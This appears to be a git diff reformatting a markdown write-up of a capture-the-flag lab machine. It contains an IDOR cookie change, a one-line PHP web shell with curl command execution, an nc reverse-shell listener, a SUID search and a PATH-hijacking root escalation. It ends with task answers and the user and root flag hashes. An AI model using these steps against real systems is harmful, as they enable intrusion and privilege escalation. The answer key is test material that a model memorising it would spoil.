@@ -23,141 +23,174 @@ tags:
 
 
 ![](/img2/Pasted%20image%2020250313133322.png)
+
 ## Introduction
 
 > In this machine, we are exploiting an IDOR with RCE. With respect to privilege escalation, we are taking advantage of leaked credential files and exploiting SUID files through PATH Hijacking.
 
 ## Reconnaissance
 
-1. Connectivity
+- Connectivity
+
 ```bash
 ping -c1 10.129.72.77
 ```
 
-2. Nmap
+- Nmap
+
 ```bash
 nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.72.77
 ```
+
 ![](/img2/Pasted%20image%2020250313133514.png)
 
-2. Fuzzing with gobuster
+- Fuzzing with gobuster
+
 ```bash
 gobuster dir -u megacorp.com -w /usr/share/wordlists/dirb/common.txt -t 100
 ```
+
 ![](/img2/Pasted%20image%2020250313141255.png)
 
-3. Intercept trafic with burpsuite
+- Intercept trafic with burpsuite
+
 ![](/img2/Pasted%20image%2020250313141418.png)
 
-4. Access to login pannel
+- Access to login pannel
+
 ![](/img2/Pasted%20image%2020250313141733.png)
 
 ## Exploitation
 
-1. Exploit IDOR
+- Exploit IDOR
+
 ![](/img2/Pasted%20image%2020250313142251.png)
+
 > Change id to 1
 
-2. Change cookie session in upload directory
+- Change cookie session in upload directory
+
 ![](/img2/Pasted%20image%2020250313142420.png)
+
 ![](/img2/Pasted%20image%2020250313142821.png)
 
-3. Upload php malicious file
+- Upload php malicious file
+
 ```bash
 echo "<?php system(\$_GET['cmd']); ?>" > cmd.php
 ```
+
 ![](/img2/Pasted%20image%2020250313143019.png)
 
-4. Execute command
+- Execute command
+
 ```bash
 curl http://megacorp.com/uploads/cmd.php?cmd=whoami
 ```
+
 ![](/img2/Pasted%20image%2020250313143251.png)
 
-5. Send reverse shell
+- Send reverse shell
+
 ![](/img2/Pasted%20image%2020250313144230.png)
+
 ```bash
 nc -nlvp 9000
 ```
 
 ## Post-exploitation
 
-1. TTY 
+- TTY 
+
 https://invertebr4do.github.io/tratamiento-de-tty/
 
-2. Find user flag
+- Find user flag
+
 ![](/img2/Pasted%20image%2020250313144611.png)
 
-3. Find credentials file
+- Find credentials file
+
 ![](/img2/Pasted%20image%2020250313150431.png)
 
-4. Change to robert user
+- Change to robert user
+
 ![](/img2/Pasted%20image%2020250313150547.png)
 
-5. Find SUID files 
+- Find SUID files 
+
 ```bash
 id
 ```
+
 ![](/img2/Pasted%20image%2020250316161355.png)
+
 ```bash
 find / -perm -4000 -group bugtracker -ls 2>/dev/null
 ```
+
 ![](/img2/Pasted%20image%2020250316161459.png)
 
-6. Review /usr/bin/bugtracker
+- Review /usr/bin/bugtracker
+
 ```bash
 strings /usr/bin/bugtracker
 ```
+
 ![](/img2/Pasted%20image%2020250316162159.png)
 
-7. Exploit PATH Hijacking
+- Exploit PATH Hijacking
+
 ```bash
 export PATH=/tmp/:$PATH
 echo "bash -p" > cat
 chmod +x cat
 /usr/bin/bugtracker
 ```
+
 ![](/img2/Pasted%20image%2020250316162516.png)
+
 ```bash
 cat /root/root.txt
 ```
+
 ![](/img2/Pasted%20image%2020250316162908.png)
+
 ## Tasks
 
 1. With what kind of tool can intercept web traffic?
 > proxy
 
-2. What is the path to the directory on the webserver that returns a login page?
+1. What is the path to the directory on the webserver that returns a login page?
 > /cdn-cgi/login
 
-3. What can be modified in Firefox to get access to the upload page?
+1. What can be modified in Firefox to get access to the upload page?
 > cookie
 
-4. What is the access ID of the admin user?
+1. What is the access ID of the admin user?
 > 34322
 
-5. On uploading a file, what directory does that file appear in on the server?
+1. On uploading a file, what directory does that file appear in on the server?
 > /uploads
 
-6. What is the file that contains the password that is shared with the robert user?
+1. What is the file that contains the password that is shared with the robert user?
 > db.php
 
-7. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
+1. What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group?
 > find
 
-8. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
+1. Regardless of which user starts running the bugtracker executable, what's user privileges will use to run?
 > root
 
-9. What SUID stands for?
+1. What SUID stands for?
 > Set Owner User ID
 
-10. What is the name of the executable being called in an insecure manner?
+1.  What is the name of the executable being called in an insecure manner?
 > cat
 
-11. Submit user flag
+1.  Submit user flag
  > f2c74ee8db7983851ab2a96a44eb7981
 
-12. Submit root flag
+1.  Submit root flag
 > af13b0bee69f8a877c3faf667f7beacf
 
 
